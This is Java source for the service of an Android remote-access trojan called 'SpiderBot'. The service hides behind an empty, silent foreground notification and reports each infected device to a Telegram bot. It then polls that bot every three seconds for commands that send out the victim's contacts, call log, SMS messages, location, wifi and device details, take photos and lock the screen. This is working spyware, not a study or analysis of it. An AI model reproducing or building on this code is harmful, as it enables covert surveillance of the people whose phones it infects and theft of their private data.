package com.spiderbot;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.util.Timer;
import java.util.TimerTask;

public class BotService extends Service {
    private static final String CHANNEL_ID = "spider_channel";
    private Timer timer;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "SpiderBot", NotificationManager.IMPORTANCE_MIN);
            ch.setSound(null, null);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        startForeground(1001, new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build());
        
        TelegramAPI.sendMessage("✅ SpiderBot Online\n📱 " + Build.MODEL);
        startListening();
    }

    private void startListening() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override public void run() {
                TelegramAPI.checkCommands(cmd -> {
                    cmd = cmd.trim().toLowerCase();
                    if (cmd.equals("/start") || cmd.equals("/help")) {
                        sendHelp();
                    }
                    else if (cmd.equals("/contacts")) TelegramAPI.sendMessage(DeviceUtils.getContacts(BotService.this));
                    else if (cmd.equals("/calllog")) TelegramAPI.sendMessage(DeviceUtils.getCallLog(BotService.this));
                    else if (cmd.equals("/sms")) TelegramAPI.sendMessage(DeviceUtils.getSMS(BotService.this));
                    else if (cmd.equals("/location")) DeviceUtils.getLocation(BotService.this, TelegramAPI::sendMessage);
                    else if (cmd.equals("/photo")) DeviceUtils.takePhoto(BotService.this, false, (f, m) -> {});
                    else if (cmd.equals("/vibrate")) DeviceUtils.vibrate(BotService.this);
                    else if (cmd.equals("/flash")) DeviceUtils.toggleFlash(BotService.this);
                    else if (cmd.equals("/lock")) DeviceUtils.lockScreen(BotService.this);
                    else if (cmd.equals("/battery")) TelegramAPI.sendMessage(DeviceUtils.getBattery(BotService.this));
                    else if (cmd.equals("/wifi")) TelegramAPI.sendMessage(DeviceUtils.getWifi(BotService.this));
                    else if (cmd.equals("/info")) TelegramAPI.sendMessage(DeviceUtils.getDeviceInfo(BotService.this));
                    else TelegramAPI.sendMessage("❌ Unknown command. Send /help");
                });
            }
        }, 0, 3000);
    }

    private void sendHelp() {
        String help = "🔥 SpiderBot Commands:\n\n" +
            "/contacts - جهات الاتصال\n" +
            "/calllog - سجل المكالمات\n" +
            "/sms - الرسائل\n" +
            "/location - الموقع\n" +
            "/photo - تصوير\n" +
            "/vibrate - اهتزاز\n" +
            "/flash - فلاش\n" +
            "/lock - قفل\n" +
            "/battery - البطارية\n" +
            "/wifi - الواي فاي\n" +
            "/info - معلومات الجهاز";
        TelegramAPI.sendMessage(help);
    }

    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { if (timer != null) timer.cancel(); super.onDestroy(); }
}
